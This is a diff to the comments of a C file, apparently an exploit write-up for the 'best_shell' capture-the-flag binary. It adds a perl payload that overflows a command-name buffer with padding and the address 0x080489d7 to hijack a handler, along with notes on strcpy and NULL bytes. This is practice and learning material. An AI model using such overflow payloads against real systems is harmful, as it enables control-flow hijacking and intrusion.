@@ -27,9 +27,16 @@
 */
 
 /*
+** pico4180@shell:/home/best_shell$ (echo "lol abcd"; echo "lol efgh"; echo "lol ijkl"; cat)|./best_shell
+** >> lol abcd
+** >> lol efgh
+** >> lol ijkl
+*/
+
+/*
 ** pico4180@shell:/home/best_shell$ (perl -e 'print "rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" . "mult" . "A"x28 ."\xd7\x89\x04\x08\x00\n"'; perl -e 'print "mult" . "A"x28 . "\xd7\x89\x04\x08" . "\n"'; cat)|./best_shell
-** "mult"A"(x 28 times)\xd7\x89\x04\x08" is the name of the new mult command
-** since strcpy stops at the first NULL characters, we can't do "mult\x00" otherwise the handler won't be replaced by our addr.
+** "mult"A"(x 28 times) is the name of the former mult command. However, this is not NULL terminated since the address (0x080489d7) is just behind.
+** Because strcpy stops at the first NULL character, we can't do "mult\x00" otherwise the handler won't be replaced by our address.
 */
 
 #include <stdio.h>
